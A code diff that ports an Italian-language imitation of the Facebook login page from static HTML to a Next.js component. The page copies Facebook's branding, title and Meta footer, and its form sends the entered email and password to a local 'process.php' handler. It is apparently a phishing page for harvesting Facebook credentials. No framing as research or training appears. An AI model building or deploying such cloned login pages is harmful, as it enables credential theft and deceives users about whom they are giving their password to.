@@ -1,42 +1,41 @@
+'use client';
 
-<!DOCTYPE html>
-<html lang="it">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Facebook - Accedi o registrati</title>
-  <link rel="stylesheet" href="facebook.css" />
-</head>
-<body>
-  <div class="top-banner">
-    <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
-  </div>
+import Image from 'next/image';
+import './facebook.css'; // Assicurati che sia in app/ o in styles/
 
-  <div class="fb-container">
-    <p class="lang">Italiano</p>
-    <img src="facebook.png" alt="Facebook logo" class="fb-logo" />
+export default function Home() {
+  return (
+    <html lang="it">
+      <body>
+        <div className="top-banner">
+          <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
+        </div>
 
-    <div class="fb-login-box">
-      <form action="process.php" method="POST" class="fb-form">
-        <input type="text" name="email" placeholder="Email o numero di telefono" required />
-        <input type="password" name="password" placeholder="Password" required />
-        <button type="submit">Accedi</button>
-        <a href="#" class="forgot">Hai dimenticato la password?</a>
-        <hr />
-        <button class="create-account">Crea nuovo account</button>
-      </form>
-    </div>
+        <div className="fb-container">
+          <p className="lang">Italiano</p>
+          <Image src="/facebook.png" alt="Facebook logo" width={200} height={60} className="fb-logo" />
 
-    <footer class="meta-footer">
-      <img src="meta.png" alt="Meta logo" class="meta-logo" />
-      <div class="meta-links">
-        <a href="#">Informazioni</a>
-        <a href="#">Centro assistenza</a>
-        <a href="#">Altro</a>
-      </div>
-    </footer>
-  </div>
-</body>
-</html>
-          
-      
+          <div className="fb-login-box">
+            <form action="process.php" method="POST" className="fb-form">
+              <input type="text" name="email" placeholder="Email o numero di telefono" required />
+              <input type="password" name="password" placeholder="Password" required />
+              <button type="submit">Accedi</button>
+              <a href="#" className="forgot">Hai dimenticato la password?</a>
+              <hr />
+              <button className="create-account">Crea nuovo account</button>
+            </form>
+          </div>
+
+          <footer className="meta-footer">
+            <Image src="/meta.png" alt="Meta logo" width={100} height={30} className="meta-logo" />
+            <div className="meta-links">
+              <a href="#">Informazioni</a>
+              <a href="#">Centro assistenza</a>
+              <a href="#">Altro</a>
+            </div>
+          </footer>
+        </div>
+      </body>
+    </html>
+  );
+            }
